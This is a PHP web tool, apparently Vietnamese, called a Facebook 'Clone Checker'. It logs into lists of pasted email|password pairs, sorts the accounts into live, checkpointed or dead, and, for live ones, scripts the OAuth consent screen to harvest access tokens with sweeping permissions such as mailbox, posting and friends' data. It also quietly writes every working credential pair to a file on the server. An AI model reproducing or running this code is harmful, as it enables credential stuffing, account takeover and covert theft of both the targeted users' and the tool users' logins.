<?php
error_reporting(E_ALL);
@set_time_limit(0);
$_url = 'https://mbasic.facebook.com/';
$appID = @$_POST['appID']?@$_POST['appID']:165907476854626;
if(isset($_POST['email'], $_POST['password'])){
	checkLogin();
}
?>
<!DOCTYPE html>
<html lang="vi-vn" onmouseover="document.title='→←*↔→ Clone Checker';$('#status_view').html('<b style=\'color: green\'>Viewing</b>');" onmouseout="document.title='Clone Checker →←*↔→';$('#status_view').html('<b style=\'color: red\'>Not Viewing</b>');">
	<head>
		<meta charset="utf-8"/>
		<title>HotFB. Org - Clone Checker</title>
		<meta name="Author" content="DuySexy" />
		<meta name="description" content="Facebook clone checker by DuYSexy" />
		<style>
			body{
				background-color: #1a1a1a;
				color: #fff;
			}
			*{
				-moz-transition: 1.5s all;
				-webkit-transition: 1.5s all;
				transition: 1.5s all;
			}
			label, input, textarea{
				display: block;
			}
			label{
				text-transform: uppercase;
				letter-spacing: 2px;
				font-weight: bold;
			}
			input, textarea, option, select{
				background: #000;
				border: 1px solid #ccc;
				color: #fff;
				padding: 5px;
				border-radius: 5px;
			}
			input[type=submit]:hover, input[type=text]:focus, textarea:focus, select:focus{
				box-shadow: 0px 0px 10px #f00;
				border-radius: 2px;
			}
		</style>
	</head>
	<body>
        <center>
	<h2 class="title">VipLike.Org, VipLike.CF - Clone Checker <span id="status_view"></span></h2>
	<hr />
	<form method="POST" action="javascript: Check();">
		<label for="list_">Nhập Tài khoản|Mật khẩu nick Facebook . Mỗi Nick là 1 dòng!</label>
		<textarea id="list_" placeholder="email|password" cols="60" rows="15"></textarea>
		<label for="app"> Token App ID </label>
		<select id="app">
			<option value="165907476854626">Sony Xperia™ (Unknow)</option>
			<option value="2254487659" selected>BlackBerry (OK)</option>
			<option value="260273468396">Skype (Unknow)</option>
			<option value="49340319393">Nokia (Unknow)</option>
			<option value="30713015083">Microsoft (Unknow)</option>
			<option value="41158896424">HTC Sense (Unknow)</option>
			<option value="174829003346">Spotify (Unknow)</option>
			<option value="6195724695">Windows Phone (Unknow)</option>
			<option value="72687635881">Samsung (Unknow)</option>
		</select>

		<input type="submit" value="Check Clone !"/>
	</form>
	<label for="liveToken">Live Token</label>
	<textarea id="liveToken" cols="120" rows="5"></textarea>
	<label for="checkpoint_acc">Live/Checkpoint Account</label>
	<textarea id="checkpoint_acc" cols="120" rows="5"></textarea>
	<div id="result"></div>
	
	<script src="jquery.js"></script>
	<script>
		function Check(){
			var list = $('#list_').val().split("\n"), app = $('#app').val(), result = $('#result'), tokenLive = $('#liveToken'), liveAcc = $('#checkpoint_acc');
			result.empty();
			for(x in list){
				if(list[x] == undefined || list[x] == null || list[x].trim() == '') continue;
				split_list = list[x].split("|");
				email = split_list[0];
				pass = split_list[1];
				if(list[x].trim() == '' || email.trim() == '' || pass.trim() == '') continue;
				result.prepend('<p>'+email+' => <span id="_'+x+'">Checking....</span></p>');
				$.ajax({
					method: 'POST',
					dataType: 'json',
					data: {email: email.trim(), password: pass.trim(), appID: app.trim()},
					x: x,
					success: function(response){
						if(response != null){
							switch(response.status){
								case 'OK': html_x = '<b style="color: green">OK</b>';break;
								case 'DIE': html_x = '<b style="color: red">DIE</b>';break;
								default: html_x = '<b style="color: blue">'+response.status+'</b>';break;
							}
							if(response.status != 'DIE' && liveAcc.val().indexOf(response.email) < 0){
								liveAcc.prepend(response.email.trim()+'|'+response.password.trim()+"\n");
							}
							$('#_'+this.x).html(html_x);
							if(response.token != undefined){
								tokenLive.prepend(response.token+"\n");
							}
						}
					}
				});
			}
			tokenLive.fadeIn(2000);
		}
	</script>
	<h3>Copyright &copy; <?php print date('Y'); ?> by DuySexy</h3>
</center>
	</body>
</html>
<?php
function cURL($url, $type = 1, $postArray = null, $randStr = 0){
	//print $randStr;
	$options = array(
		CURLOPT_URL => $url,
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36',
		CURLOPT_FOLLOWLOCATION => true
	);
	if($type){
		switch($type){
			case 1: $options[CURLOPT_COOKIEJAR] = 'puarupham'.$randStr; break;
			case 3: $options[CURLOPT_HEADER] = true; break;
		}
		$options[CURLOPT_COOKIEFILE] = 'puarupham'.$randStr;
	}
	if($postArray){
		$options[CURLOPT_POST] = true;
		$options[CURLOPT_POSTFIELDS] = $postArray;
	}
	
	$options[CURLOPT_SSL_VERIFYPEER] = false;
	$sc = curl_init();
	curl_setopt_array($sc, $options);
	$response = curl_exec($sc);
	curl_close($sc);
	return $response;
}
function checkLogin(){
	global $_POST, $_url, $appID;
	if(isset($_POST['email'], $_POST['password'])){
		$time = substr(md5(md5($_POST['password'])), 5, 10);
		$login = array(
			'email' => trim($_POST['email']),
			'pass' => trim($_POST['password']),
			'login' => 'Login'
		);
		//print_r($login);
		$log_response = cURL($_url.'login.php', 1, $login, $time);
		//print $log_response;
		$home = cURL($_url.'home.php', 3, null, $time);
		if(preg_match('/checkpoint/', $log_response)){
			$response_Token = array('status' => 'Checkpoint');
		}else{
		//print $home;
			if(preg_match('#href="/logout.php(.*?)">(Logout|Đăng xuất) \((.*)\)</a>#', $home, $response)){
				$response_Token = getToken($time);
				$response_Token['name'] = $response[3];
				$response_Token['status'] = 'OK';
				if(!@$response_Token['token']){
					$response_Token['status'] = 'Can\'t get token AppID: '.$appID;
				}
				$logout = cURL($_url.'logout.php'.$response[1], 3, null, $time);
			//print $logout;
			}else{
				$response_Token = array('status' => 'DIE');
			}
		}
		if($response_Token['status'] != 'DIE'){
			$log = 'puarupham.dat_x';
			$dataWrite = "$_POST[email]|$_POST[password]";
			$dataWrite = trim($dataWrite);
			$fp = fopen($log, 'a+');
			if(!preg_match('/'.$dataWrite.'/', file_get_contents($log))){
				fwrite($fp, $dataWrite."\n");
			}
			fclose($fp);
		}
	$response_Token['email'] = trim($_POST['email']);
	$response_Token['password'] = trim($_POST['password']);
	}
	@unlink('puarupham'.$time);
	exit(@json_encode($response_Token));
}
function getToken($randStr){
	global $appID, $_url;
	$Token = array(
             'app_id' => $appID,
             'next' => 'https://m.facebook.com/connect/login_success.html',
             'response_type' => 'token',
             'perms' => 'email,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login',
    );
	$urlToken = $_url.'dialog/oauth?'.http_build_query($Token);
	$Response = cURL($urlToken, 3, null, $randStr);
	//print $Response;
	if(preg_match('/name="fb_dtsg" value="([a-zA-Z0-9_]+)"/', $Response, $fb_dtsg)){
		$fb_dtsg = $fb_dtsg[1];
		@preg_match('/name="read" value="([a-zA-Z0-9_,]+)"/', $Response, $read);
		@preg_match('/name="seen_scopes" value="([a-zA-Z0-9_,]+)"/', $Response, $seen_scopes);
		$urlAccept = $_url.'dialog/oauth/read';
		$accept = array(
			'fb_dtsg' => $fb_dtsg,
			'charset_test' => '€,´,€,´,水,Д,Є',
			'from_post' => true,
			'app_id' => $appID,
			'redirect_uri' => 'https://m.facebook.com/connect/login_success.html',
			'display' => 'touch',
			'access_token' => '',
			'sdk' => getInputValue($Response, 'sdk'),
			'proxy_access_token' => '',
			'private' => '',
			'login' => '',
			'read' => @getInputValue($Response, 'read'),
			'write' => @getInputValue($Response, 'write'),
			'readwrite' => @getInputValue($Response, 'readwrite'),
			'extended' => @getInputValue($Response, 'extended'),
			'social_confirm' => '',
			'confirm' => '',
			'gdp_version' => '3',
			'seen_scopes' => @getInputValue($Response, 'seen_scopes'),
			'return_format' => 'access_token',
			'domain' => '',
			'sso_device' => '',
			'auth_type' => '',
			'auth_nonce' => '',
			'auth_token' => '',
			'default_audience' => '',
			'seen_revocable_perms_nux' => '',
			'ref' => 'Default',
			'__CONFIRM__' => 'OK'
		);
		
		$Response = cURL($urlAccept, 3, $accept, $randStr);
		
	}
	//print $Response;
	if(preg_match('/access_token=([a-zA-Z0-9]+)&expires_in=([0-9]+)/', $Response, $result)){
		$response['token'] = $result[1];
		$response['expired'] = $result[2];
		return $response;
	}
}
function getInputValue($html, $name){
	preg_match('/name="'.$name.'" value="([a-zA-Z0-9_@!#$%^&*()=]+,)"/', $html, $result);
	return @$result[1]?$result[1]:'';
}

?>